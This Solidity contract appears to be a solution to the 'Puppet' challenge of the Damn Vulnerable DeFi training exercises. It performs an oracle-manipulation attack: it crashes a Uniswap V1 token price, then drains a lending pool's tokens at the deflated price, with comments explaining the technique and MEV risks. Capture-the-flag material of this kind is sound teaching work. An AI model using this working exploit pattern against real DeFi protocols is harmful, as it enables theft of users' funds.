// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import { IPuppetPool } from "./Interfaces/IPuppetPool.i.sol";
import { IUniswapV1Exchange } from "../helpers/uniswap-v1-abi/IUniswapV1Exchange.i.sol";
import { DamnValuableToken } from "../DamnValuableToken.sol";

contract PuppetMaster {
    IPuppetPool private lendingPool;
    IUniswapV1Exchange private exchange;
    DamnValuableToken private token;
    address private player;

    uint256 private constant UNISWAP_INITIAL_TOKEN_RESERVE = 10 * 1e18;
    uint256 private constant UNISWAP_INITIAL_ETH_RESERVE = 10 * 1e18;
    uint256 private constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 * 1e18;
    uint256 private constant PLAYER_INITIAL_ETH_BALANCE = 25 * 1e18;
    uint256 private constant POOL_INITIAL_TOKEN_BALANCE = 100000 * 1e18;

    constructor(address _lendingPool, address _exchange, address _token, address _player) payable {
        lendingPool = IPuppetPool(_lendingPool);
        exchange = IUniswapV1Exchange(_exchange);
        token = DamnValuableToken(_token);
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // Once again, the player starts with 25 ETH and 1000 DVTs, which have
        // been transferred into this contract for you to use. And once again,
        // the test checks if the player account has the required eth and tokens,
        // so you must transfer to the player address in order to pass.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // Like the previous challenge, the solution for this one involves a
        // class of attack known as "oracle manipulation". Because the lending
        // pool uses a dex to get the price of a token, if we can crash the
        // price on the dex, then we can borrow from the lending pool at a
        // significantly reduced price. And because the lending pool's token
        // balance is very high compared to the exchange, it is profitable
        // for an attacker to do exactly that.

        // We (the player) also start with a high balance relative to the
        // dex, which means it is easy for us to crash the price. In earlier
        // times, it was more difficult to manipulate popular exchanges, because
        // they had a significant amount of money. But with the invention of
        // flash loans, crashing an exchange's price for the duration of a
        // transaction has become trivial, and any time there is profit to be
        // made doing so, you can bet there is an MEV bot ready to pounce!

        // Step 1: Crash the price by selling all of our tokens to the dex
        token.approve(address(exchange), token.balanceOf(address(this)));
        // This next function was found by reading the docs and the interface
        // and trying some functions in an Anvil local chain until I found a
        // function that did what I wanted.
        exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, block.timestamp);

        // Note that the previous tokenToEthTransferInput() function parameters
        // have some very dangerous parameters. Setting the min_eth to 1 wei in
        // the second parameter would allow MEV bots to front run this and crash
        // price of the token, so we would be much less eth than expected.
        // And setting the deadline to block.timestamp allows a miner to decide
        // when to mine the transaction, which may allow them to MEV it as well.
        // While these negative effects can be mitigated by using private
        // RPC endpoints like "Flashbots protect", it is still best practice
        // to determine appropriate values for the parameters and use them,
        // rather than being lazy like I have been here.

        // Even private RPC endpoints can fail, such as in the "sandwich the
        // ripper" attack**, where a malicious miner found a way to get the
        // private endpoint to reveal the transactions before the miner mined
        // them, allowing the miner to MEV all transactions in the block when
        // it was his turn to be the block proposer. (Humorously, the miner
        // also front-run and sandwich-attacked all the *other* MEV bot
        // transactions in the block, earning the nickname "sandwich the
        // ripper" and making out with over $20 million.)

        // ** https://collective.flashbots.net/t/post-mortem-april-3rd-2023-mev-boost-relay-incident-and-related-timing-issue/1540
        //    https://eigenphi.substack.com/p/how-did-a-malicious-validator-steal
        //    https://www.youtube.com/watch?v=_0gItL8IyPQ

        // Step 2: "Borrow" all of the pool's tokens, sending along all of our
        // eth as collateral
        lendingPool.borrow{ value: address(this).balance }(token.balanceOf(address(lendingPool)), address(this));

        // Note again the poor practice by me in solving this challenge. Just
        // as before, in the real world, and hopefully in your solution, you
        // should compute the exact amounts required, so that your transaction
        // cannot itself be exploited. Especially in this exercise, where the
        // pool contract provides a function that allows you to determine
        // exactly what the exchange price is. My justification for this poor
        // practice in this instance is the fact that the pool contains the
        // following code:
        // --------------------------------------------------------------------
        //    if (msg.value > depositRequired) {
        //        unchecked {
        //            payable(msg.sender).sendValue(msg.value - depositRequired);
        //        }
        //    }
        // --------------------------------------------------------------------
        // which sends the extra eth back to the sender. Still, it is always
        // best to be secure yourself, since you can't always count on others.
        // (Perhaps the pool contract you've been given isn't really what's
        // deployed!) Always be careful and vigilant in the web3 space.

        // Step 3: Send the player all the eth and tokens.
        token.transfer(player, token.balanceOf(address(this)));
        player.call{ value: address(this).balance }("");

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=7pf3COTx708
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
